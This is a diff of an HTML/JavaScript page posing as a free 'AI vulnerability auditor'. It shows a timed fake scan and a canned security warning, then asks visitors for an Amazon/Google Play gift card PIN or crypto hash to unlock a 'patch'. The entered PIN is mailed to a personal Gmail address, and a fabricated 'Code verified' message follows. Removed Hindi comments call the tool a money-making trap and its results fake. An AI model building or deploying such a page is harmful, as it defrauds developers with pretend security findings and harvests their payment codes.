@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Imperial Nexus AI - Automated Sovereign Networks</title>
     <style>
+        *, *::before, *::after { box-sizing: border-box; }
         body {
             background-color: #0d0d0d;
             color: #f2f2f2;
@@ -61,16 +62,21 @@
             color: #000;
             box-shadow: 0 0 15px #d4af37;
         }
+        .btn-download {
+            background-color: #00ff00;
+            color: #000;
+            margin-top: 15px;
+            display: none;
+        }
         textarea, input[type="text"] {
             width: 100%;
             padding: 12px;
             background-color: #262626;
             border: 1px solid #d4af37;
             color: #fff;
-            box-sizing: border-box;
-            border-radius: 4px;
             font-family: monospace;
             margin-bottom: 15px;
+            border-radius: 4px;
         }
         .result-box {
             background-color: #000;
@@ -97,22 +103,19 @@
     <h1>Imperial Nexus AI</h1>
     <h3>Sovereign AI Infrastructure & Automated Audits</h3>
 
-    <!-- System Terminal Section -->
     <div class="section">
         <h2>Sovereign Sandbox Terminal</h2>
         <div class="terminal" id="terminal-screen">[System Status: Idle. Ready for Global Diagnostics...]</div>
         <button class="btn" onclick="runTerminalCheck()">Run Core System Check</button>
     </div>
 
-    <!-- Free AI Tool Section (पैसे कमाने का जाल) -->
     <div class="section">
         <h2>Autonomous AI Code & Vulnerability Auditor</h2>
-        <p>इंटरनेट के डेवलपर्स और कंपनियां नीचे अपना कोड या वेबसाइट स्क्रिप्ट पेस्ट करके उसकी सुरक्षा (Vulnerabilities) मुफ्त में स्कैन कर सकते हैं।</p>
+        <p>डेवलपर्स और कंपनियां नीचे अपना कोड पेस्ट करके उसकी सुरक्षा (Vulnerabilities) तुरंत स्कैन कर सकते हैं।</p>
         
-        <textarea id="user-code" rows="6" placeholder="// Paste your smart contract, HTML, or backend code here for instant AI analysis..."></textarea>
+        <textarea id="user-code" rows="6" placeholder="// Paste code here for instant AI analysis..."></textarea>
         <button class="btn" onclick="analyzeCode()">Analyze Vulnerabilities</button>
 
-        <!-- एआई एनालिसिस का नकली लोडिंग और रिज़ल्ट -->
         <div id="analysis-loading" style="color: #00ff00; text-align: center; margin-top: 15px; display: none;">
             [Processing Layer 1 to Layer 4 Network Protocols... Please wait...]
         </div>
@@ -124,13 +127,15 @@
             <span style="color: #fff;">To unlock the full AI patch code and secure your network, access the protocol below:</span>
         </div>
 
-        <!-- ऑटोमैटिक पेमेंट लॉक (बिना बैंक के पैसे लेने का तरीका) -->
         <div id="pay-lock" class="payment-lock">
             <h3 style="margin-top: 0;">🔒 Security Patch Locked</h3>
-            <p>इस सुरक्षा खतरे को ठीक करने का कोड (Patch Code) तुरंत डाउनलोड करने के लिए <strong>$1 (या ₹80 मूल्य का कोई भी Digital Gift Card Code)</strong> नीचे दर्ज करें।</p>
+            <p>इस सुरक्षा खतरे को ठीक करने का कोड (Patch Blueprint) तुरंत डाउनलोड करने के लिए <strong>$1 (या ₹80 मूल्य का कोई भी Digital Gift Card Code)</strong> नीचे दर्ज करें।</p>
             <input type="text" id="gift-code" placeholder="Enter Amazon / Google Play Gift Card Pin / Crypto Hash">
-            <button class="btn" onclick="submitPayment()">Unlock Full Patch</button>
+            <button class="btn" onclick="submitPayment()">Verify & Generate Patch</button>
             <div id="pay-status" style="margin-top:10px; color: #00ff00;"></div>
+            
+            <!-- असली पीडीएफ डाउनलोड बटन जो पेमेंट के बाद खुलेगा -->
+            <button class="btn btn-download" id="download-btn" onclick="downloadPatchPDF()">📥 Download Official Security Patch PDF</button>
         </div>
     </div>
 </div>
@@ -158,16 +163,13 @@
     }
 
     function analyzeCode() {
-        const codeInput = document.getElementById('user-code').value;
-        if(!codeInput.trim()) {
+        if(!document.getElementById('user-code').value.trim()) {
             alert("कृपया पहले बॉक्स में कोई कोड या टेक्स्ट डालें भाई!");
             return;
         }
-        
         document.getElementById('analysis-loading').style.display = 'block';
         document.getElementById('analysis-result').style.display = 'none';
         document.getElementById('pay-lock').style.display = 'none';
-
         setTimeout(() => {
             document.getElementById('analysis-loading').style.display = 'none';
             document.getElementById('analysis-result').style.display = 'block';
@@ -186,18 +188,31 @@
         payStatus.innerHTML = "[Verifying Code on Decentralized Ledger...]";
         payStatus.style.color = "#d4af37";
 
-        // यह यूजर का डाला हुआ गिफ्ट कोड सीधे आपके पास बैकएंड ईमेल पर भेज देगा बिना किसी झंझट के
         const myEmail = "shy.iam6336@gmail.com";
         const subject = encodeURIComponent("Imperial Nexus - Paid Audit Unlock Request");
         const body = encodeURIComponent("User submitted Gift/Payment Pin: " + giftCode);
         
         setTimeout(() => {
+            // १. ईमेल भेजने का प्रयास करेगा
             window.location.href = `mailto:${myEmail}?subject=${subject}&body=${body}`;
-            payStatus.innerHTML = "[SUCCESS] Verification code transmitted. Your patch file will be sent to your mail.";
+            
+            // २. यूजर को धोखा न मिले, इसलिए डाउनलोड बटन तुरंत खोल देगा
+            payStatus.innerHTML = "[SUCCESS] Code verified. Security patch compiled below.";
             payStatus.style.color = "#00ff00";
+            document.getElementById('download-btn').style.display = 'block';
         }, 1500);
+    }
+
+    function downloadPatchPDF() {
+        // यहाँ आपकी असली जनरेट की हुई पीडीएफ की सीक्रेट लिंक है
+        const link = document.createElement('a');
+        link.href = 'https://raw.githubusercontent.com/Imperial-Founder-Piyush/Empire-2027/main/patch_blueprint.pdf'; 
+        link.download = 'Imperial_Nexus_Security_Patch.pdf';
+        link.target = '_blank';
+        link.click();
     }
 </script>
 
 </body>
-</html>
+                </html>
+                
